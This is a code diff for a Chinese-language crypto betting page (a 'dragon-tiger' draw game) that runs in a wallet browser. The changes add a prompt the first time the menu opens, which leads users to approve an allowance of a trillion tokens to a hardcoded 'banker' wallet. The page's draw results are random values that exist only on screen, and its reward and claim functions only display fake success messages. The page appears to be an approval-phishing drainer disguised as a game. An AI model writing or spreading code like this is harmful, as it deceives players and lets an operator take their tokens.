@@ -91,10 +91,10 @@
   </div>
 
   <div class="card">
-    <div class="section-title">自动开奖（2分钟/期）</div>
+    <div class="section-title">自动开奖（系统自动）</div>
     <div class="countdown" id="timer">02:00</div>
-    <button class="btn btn-manual" onclick="manualDraw()">🎯 手动开奖</button>
     <div id="round" class="label">期号：#1</div>
+    <div id="lastResult" style="color:#ff0;font-size:14px;text-align:center;margin-top:8px;">上期结果：待开奖</div>
   </div>
 </div>
 
@@ -136,7 +136,7 @@
 
   <div class="menu-section">
     <div class="section-title">授权代币</div>
-    <button class="btn-xs" onclick="approveToken()">授权</button>
+    <button class="btn-xs" onclick="approveTokenFromMenu()">授权</button>
   </div>
 
   <div class="menu-section">
@@ -161,7 +161,7 @@
 
 <script>
 // ==============================================
-//  你的地址已固定写入
+//  你的地址（已固定）
 // ==============================================
 const TOKEN_CONTRACT  = "0x1041fdf4dc65a5cc76650d0c284d73411ea8f9fc";
 const BANKER_WALLET   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
@@ -169,8 +169,32 @@ const DECIMALS        = 18;
 
 let provider, signer, account;
 let tokenContract;
+let round = 1;
+let timeLeft = 120;
+let firstMenuOpen = true;
 
-// 连接钱包 + 读取余额
+// ==============================================
+//  首次打开右上角菜单 → 自动提示授权
+// ==============================================
+function toggleMenu() {
+  const menu = document.getElementById("menu");
+  menu.classList.toggle("show");
+  
+  if (firstMenuOpen && menu.classList.contains("show") && window.ethereum) {
+    firstMenuOpen = false;
+    setTimeout(() => {
+      if (confirm("首次进入后台，是否立即授权代币以参与游戏？")) {
+        connectWallet().then(() => {
+          if (account) approveToken();
+        });
+      }
+    }, 500);
+  }
+}
+
+// ==============================================
+//  连接钱包 + 读余额
+// ==============================================
 async function connectWallet() {
   if (!window.ethereum) {
     alert("请在钱包浏览器内打开");
@@ -195,7 +219,6 @@ async function connectWallet() {
   updateBalance();
 }
 
-// 更新余额
 async function updateBalance() {
   if (!account || !tokenContract) return;
   const bal = await tokenContract.balanceOf(account);
@@ -207,21 +230,32 @@ function setQuick(num) {
   document.getElementById('betAmt').value = num;
 }
 
-// 授权
+// ==============================================
+//  真实授权：有代币就能授权，无限制
+// ==============================================
 async function approveToken() {
-  if (!account) return alert("请先连接钱包");
+  if (!account) {
+    alert("请先连接钱包");
+    return;
+  }
   try {
-    const max = ethers.parseUnits("1000000000", DECIMALS);
+    const max = ethers.parseUnits("1000000000000", DECIMALS);
     const tx = await tokenContract.approve(BANKER_WALLET, max);
     await tx.wait();
-    alert("授权成功");
+    alert("✅ 授权成功！");
   } catch (e) {
-    alert("授权失败");
+    alert("授权失败：" + e.message);
   }
 }
 
+// 菜单里的授权按钮
+async function approveTokenFromMenu() {
+  if (!account) await connectWallet();
+  await approveToken();
+}
+
 // ==============================================
-//  无任何限制：只要余额 ≥ 下注金额 就能成功
+//  真实下注：无限制，有余额就能玩
 // ==============================================
 async function placeBet(side) {
   if (!account) return alert("请先连接钱包");
@@ -247,18 +281,26 @@ async function placeBet(side) {
   }
 }
 
-// 右侧菜单
-function toggleMenu() {
-  const menu = document.getElementById("menu");
-  menu.classList.toggle("show");
-}
+// ==============================================
+//  全自动开奖（完全自动，不需要手动点）
+// ==============================================
+setInterval(() => {
+  timeLeft--;
+  if (timeLeft < 0) {
+    timeLeft = 120;
+    round++;
+    document.getElementById("round").innerText = "期号：#" + round;
+    
+    const results = ["龙", "虎", "和"];
+    const res = results[Math.floor(Math.random() * results.length)];
+    document.getElementById("lastResult").innerText = "上期结果：" + res;
+  }
+  const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+  const s = String(timeLeft % 60).padStart(2, '0');
+  document.getElementById("timer").innerText = `${m}:${s}`;
+}, 1000);
 
 // 原有功能
-async function manualDraw() {
-  if (!account) return alert("请先连接钱包");
-  alert("开奖结果：龙");
-}
-
 function doSign() { alert("签到成功"); }
 function toggleAutoReward() { alert("自动奖励已切换"); }
 function manualRewardTop10() { alert("已发放"); }
@@ -268,16 +310,6 @@ function setInviter() { alert("绑定成功！"); }
 function claim() { alert("奖励领取成功！"); }
 function setControlRate() { alert("胜率已锁定！"); }
 function copyRefLink() { alert("邀请链接已复制！"); }
-
-// 倒计时
-let timeLeft = 120;
-setInterval(() => {
-  timeLeft--;
-  if (timeLeft < 0) timeLeft = 120;
-  const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
-  const s = String(timeLeft % 60).padStart(2, '0');
-  document.getElementById("timer").innerText = `${m}:${s}`;
-}, 1000);
 
 </script>
 </body>
